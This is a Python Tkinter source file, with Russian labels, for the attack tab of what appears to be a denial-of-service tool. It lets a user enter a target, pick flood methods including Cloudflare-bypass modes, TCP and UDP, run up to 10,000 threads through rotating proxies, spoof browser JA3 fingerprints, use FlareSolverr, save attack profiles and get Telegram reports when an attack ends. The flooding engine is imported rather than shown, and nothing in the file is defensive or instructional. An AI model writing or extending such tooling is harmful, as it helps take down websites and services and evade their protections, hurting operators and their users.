files.gui/tabs/attack_tab.py:
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading, time, requests
from engine.attack import AsyncAttackEngine
from gui.widgets import ToolTip, RightClickMenu
from utils.helpers import load_profiles, save_profile, delete_profile

class AttackTab:
    def __init__(self, notebook, app):
        self.app = app
        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text="💥 Атака")
        self.proxy_mgr = app.proxy_manager
        self.attack_active = False
        self.engine = None
        self._build_ui()
        self._animating = False
        self.app.logger.info("Вкладка Атаки инициализирована")

    def _build_ui(self):
        self.frame.columnconfigure(0, weight=1)
        self.frame.rowconfigure(1, weight=1)

        param_frame = ttk.LabelFrame(self.frame, text="Параметры атаки", padding=10)
        param_frame.grid(row=0, column=0, sticky='ew', padx=10, pady=5)
        for i in range(6): param_frame.columnconfigure(i, weight=1)

        ttk.Label(param_frame, text="Профиль:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.profile_var = tk.StringVar()
        self.profile_combo = ttk.Combobox(param_frame, textvariable=self.profile_var, state='readonly', width=20)
        self.profile_combo.grid(row=0, column=1, columnspan=2, sticky='we')
        self.profile_combo.bind('<<ComboboxSelected>>', self._load_profile)
        ttk.Button(param_frame, text="💾 Сохранить", command=self._save_profile).grid(row=0, column=3, padx=2)
        ttk.Button(param_frame, text="🗑 Удалить", command=self._delete_profile).grid(row=0, column=4, padx=2)
        self._refresh_profiles()

        ttk.Label(param_frame, text="Цель:").grid(row=1, column=0, sticky='w', padx=5, pady=2)
        self.target_entry = ttk.Entry(param_frame, width=50)
        self.target_entry.grid(row=1, column=1, columnspan=3, sticky='we')
        RightClickMenu(self.target_entry)
        ttk.Button(param_frame, text="📋", width=3, command=lambda: self.target_entry.insert(0, self.app.root.clipboard_get())).grid(row=1, column=4)
        ttk.Button(param_frame, text="📂", width=3, command=self._load_targets_file).grid(row=1, column=5, padx=2)

        ttk.Label(param_frame, text="Метод:").grid(row=2, column=0, sticky='w')
        self.method_var = tk.StringVar(value="CFBUAM")
        methods = ttk.Combobox(param_frame, textvariable=self.method_var,
                               values=["GET","POST","CFB","CFBUAM","BOT","TCP","UDP"],
                               state='readonly', width=15)
        methods.grid(row=2, column=1, sticky='w')

        ttk.Label(param_frame, text="Потоки:").grid(row=2, column=2, sticky='w')
        self.threads_var = tk.IntVar(value=100)
        ttk.Spinbox(param_frame, from_=10, to=10000, increment=10, textvariable=self.threads_var, width=8).grid(row=2, column=3, sticky='w')
        self.power_var = tk.BooleanVar()
        ttk.Checkbutton(param_frame, text="Макс", variable=self.power_var).grid(row=2, column=4, sticky='w')
        self.storm_var = tk.BooleanVar()
        ttk.Checkbutton(param_frame, text="Браузерный шторм", variable=self.storm_var).grid(row=2, column=5, sticky='w')

        btn_frame = ttk.Frame(param_frame)
        btn_frame.grid(row=3, column=0, columnspan=6, pady=10)
        self.attack_btn = ttk.Button(btn_frame, text="🚀 ЗАПУСТИТЬ (Enter)", command=self._start_attack)
        self.attack_btn.pack(side=tk.LEFT, padx=10)
        self.stop_btn = ttk.Button(btn_frame, text="⏹ СТОП (Esc)", command=self._stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=10)

        adv_frame = ttk.LabelFrame(param_frame, text="Расширенные", padding=5)
        adv_frame.grid(row=4, column=0, columnspan=6, sticky='ew', pady=5)
        self.flare_url_var = tk.StringVar()
        ttk.Label(adv_frame, text="FlareSolverr:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        ttk.Entry(adv_frame, textvariable=self.flare_url_var, width=30).grid(row=0, column=1, columnspan=2, sticky='we')
        self.ja3_var = tk.StringVar(value="none")
        ttk.Label(adv_frame, text="JA3:").grid(row=1, column=0, sticky='w')
        ttk.Combobox(adv_frame, textvariable=self.ja3_var, values=["none","chrome120","firefox115"], state='readonly', width=12).grid(row=1, column=1, sticky='w')
        self.stealth_var = tk.BooleanVar()
        ttk.Checkbutton(adv_frame, text="Тихая", variable=self.stealth_var).grid(row=1, column=2, sticky='w')
        ttk.Label(adv_frame, text="Задержка(мс):").grid(row=2, column=0, sticky='w')
        self.jitter_var = tk.IntVar(value=0)
        ttk.Spinbox(adv_frame, from_=0, to=100, width=5, textvariable=self.jitter_var).grid(row=2, column=1, sticky='w')

        proxy_frame = ttk.LabelFrame(param_frame, text="Прокси (свой список)", padding=5)
        proxy_frame.grid(row=5, column=0, columnspan=6, sticky='ew', pady=5)
        self.custom_proxy_text = tk.Text(proxy_frame, height=3, width=70,
                                         bg='#2d2d2d' if self.app.bg=='#1e1e1e' else 'white',
                                         fg=self.app.fg)
        self.custom_proxy_text.pack(fill=tk.BOTH, expand=True)
        RightClickMenu(self.custom_proxy_text)

        self.log = scrolledtext.ScrolledText(self.frame,
                                             bg='#1e1e1e' if self.app.theme=='dark' else 'white',
                                             fg='lime' if self.app.theme=='dark' else 'black')
        self.log.grid(row=1, column=0, sticky='nsew', padx=10, pady=5)
        RightClickMenu(self.log, get_text_func=lambda: self.log.get("1.0", tk.END).strip())
        self.log.tag_configure("success", foreground="lime")
        self.log.tag_configure("error", foreground="red")
        self.log.tag_configure("info", foreground="cyan")

        if hasattr(self.app.root, 'drop_target_register'):
            self.target_entry.drop_target_register('*')
            self.target_entry.dnd_bind('<<Drop>>', self._on_drop_target)

        self.app.root.bind('<Return>', lambda e: self._start_attack())
        self.app.root.bind('<Escape>', lambda e: self._stop_attack())
        self.app.root.bind('<Control-l>', lambda e: self.log.delete(1.0, tk.END))

    def _refresh_profiles(self):
        profiles = load_profiles()
        self.profile_combo['values'] = list(profiles.keys())

    def _save_profile(self):
        name = simpledialog.askstring("Профиль", "Имя профиля:")
        if not name: return
        config = {
            'target': self.target_entry.get().strip(),
            'method': self.method_var.get(),
            'threads': self.threads_var.get(),
            'power': self.power_var.get(),
            'storm': self.storm_var.get(),
            'flare_url': self.flare_url_var.get(),
            'ja3': self.ja3_var.get(),
            'stealth': self.stealth_var.get(),
            'jitter': self.jitter_var.get(),
            'custom_proxies': self.custom_proxy_text.get("1.0", tk.END).strip()
        }
        save_profile(name, config)
        self._refresh_profiles()
        self.profile_var.set(name)

    def _load_profile(self, event=None):
        name = self.profile_var.get()
        profiles = load_profiles()
        if name not in profiles: return
        config = profiles[name]
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, config.get('target', ''))
        self.method_var.set(config.get('method', 'CFBUAM'))
        self.threads_var.set(config.get('threads', 100))
        self.power_var.set(config.get('power', False))
        self.storm_var.set(config.get('storm', False))
        self.flare_url_var.set(config.get('flare_url', ''))
        self.ja3_var.set(config.get('ja3', 'none'))
        self.stealth_var.set(config.get('stealth', False))
        self.jitter_var.set(config.get('jitter', 0))
        self.custom_proxy_text.delete("1.0", tk.END)
        self.custom_proxy_text.insert("1.0", config.get('custom_proxies', ''))

    def _delete_profile(self):
        name = self.profile_var.get()
        if not name: return
        delete_profile(name)
        self._refresh_profiles()
        self.profile_var.set('')

    def _on_drop_target(self, event):
        data = event.data
        files = self.app.root.tk.splitlist(data)
        if files:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, files[0])

    def _load_targets_file(self):
        f = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if f:
            with open(f) as fh:
                first_line = fh.readline().strip()
                if first_line:
                    self.target_entry.delete(0, tk.END)
                    self.target_entry.insert(0, first_line)

    def _start_attack(self):
        if self.attack_active: return
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        method = self.method_var.get()
        threads = self.threads_var.get()
        if self.power_var.get(): threads = min(threads*2, 10000)
        if self.stealth_var.get(): threads = 1
        jitter = self.jitter_var.get()
        flare_url = self.flare_url_var.get().strip() or None
        ja3_profile = self.ja3_var.get() if self.ja3_var.get() != "none" else None
        proxy_list = self._get_proxy_list()
        if not proxy_list and self.proxy_mgr.proxies:
            proxy_list = self.proxy_mgr.get_best_proxies()

        self.engine = AsyncAttackEngine(proxy_list, port=None, obfuscate=True, jitter=jitter,
                                        flare_solverr_url=flare_url, ja3_profile=ja3_profile,
                                        stealth=self.stealth_var.get(),
                                        browser_storm=self.storm_var.get())
        self.attack_active = True
        self._animate_start()
        self.stop_btn.config(state=tk.NORMAL)
        self.log.insert(tk.END, "[*] Атака начата\n", "info")
        self.app.logger.info(f"Атака запущена: {target} метод {method} потоков {threads}")
        threading.Thread(target=self._run_attack, args=(target, method, threads), daemon=True).start()

    def _animate_start(self):
        self._animating = True
        self._animate_button(0)

    def _animate_button(self, count):
        if not self._animating or not self.attack_active: return
        colors = ['#ff4444', '#aa0000']
        self.attack_btn.config(text="⚡ АТАКА...", foreground=colors[count % 2])
        self.frame.after(500, self._animate_button, count + 1)

    def _attack_finished(self):
        self._animating = False
        self.attack_btn.config(text="🚀 ЗАПУСТИТЬ (Enter)", foreground=self.app.fg)
        self.stop_btn.config(state=tk.DISABLED)

    def _log_colored(self, msg, tag):
        self.log.insert(tk.END, msg, tag)
        self.log.see(tk.END)

    def _run_attack(self, target, method, threads):
        start = time.time()
        def progress(rps, total):
            self.app.update_monitor(rps, total)
            self._log_colored(f"RPS: {rps:.1f} | Запросов: {total}\n", "success")
        try:
            self.engine.launch(target, method, threads, progress_callback=progress)
        except Exception as e:
            self.app.logger.error(f"Ошибка в движке атаки: {e}")
            self._log_colored(f"❌ Ошибка: {e}\n", "error")
        end = time.time()
        total_requests = self.engine.stats['count']
        self.app.save_attack_history(target, method, threads, start, end, total_requests)
        self.attack_active = False
        self.frame.after(0, self._attack_finished)
        self._log_colored(f"[✓] Атака завершена за {end-start:.1f}с, запросов: {total_requests}\n", "info")
        self._notify_telegram(target, method, threads, end-start, total_requests)

    def _stop_attack(self):
        if self.engine: self.engine.stop()
        self.attack_active = False
        self.app.logger.warning("Атака остановлена пользователем")
        self._attack_finished()

    def _get_proxy_list(self):
        custom = self.custom_proxy_text.get("1.0", tk.END).strip()
        if custom:
            return [line.strip() for line in custom.splitlines() if line.strip()]
        if self.proxy_mgr and self.proxy_mgr.proxies:
            return self.proxy_mgr.get_best_proxies(50)
        return []

    def _notify_telegram(self, target, method, threads, duration, total_requests):
        token = self.app.settings.get('telegram_token', '')
        chat_id = self.app.settings.get('telegram_chat_id', '')
        if not token or not chat_id: return
        try:
            msg = f"✅ Атака завершена\nЦель: {target}\nМетод: {method}\nПотоков: {threads}\nДлительность: {duration:.1f}с\nЗапросов: {total_requests}"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                          json={"chat_id": chat_id, "text": msg}, timeout=5)
        except: pass
